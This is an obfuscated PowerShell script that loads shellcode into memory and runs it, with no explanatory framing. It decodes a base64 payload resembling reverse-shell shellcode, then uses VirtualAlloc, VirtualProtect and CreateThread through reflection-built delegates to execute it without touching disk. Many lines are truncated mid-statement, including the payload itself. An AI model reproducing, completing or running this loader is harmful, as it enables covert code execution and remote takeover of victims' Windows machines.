function sq {
        Param ($lT, $ldd)
        $wZx51 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetTyp>

        return $wZx51.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.H>
}

function pa8 {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $bINY,
                [Parameter(Position = 1)] [Type] $sBuv = [Void]
        )

        $dx2u = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyB>
        $dx2u.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $bINY).SetImplementationFlags('Runtime, Manage>
        $dx2u.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $sBuv, $bINY).SetImplementationFlags('Runtime, Managed')

        return $dx2u.CreateType()
}

[Byte[]]$uLy = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPh>
[Uint32]$rdQfL = 0
$cU7BT = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sq kernel32.dll VirtualAlloc), (pa8 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([In>

[System.Runtime.InteropServices.Marshal]::Copy($uLy, 0, $cU7BT, $uLy.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sq kernel32.dll VirtualProtect), (pa8 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeBy>
        $xj = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sq kernel32.dll CreateThread), (pa8 @([IntPtr], [UInt32], [IntPtr], [IntPtr],>
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((sq kernel32.dll WaitForSingleObject), (pa8 @([IntPtr], [Int32]))).Invoke($xj,0xffff>
}







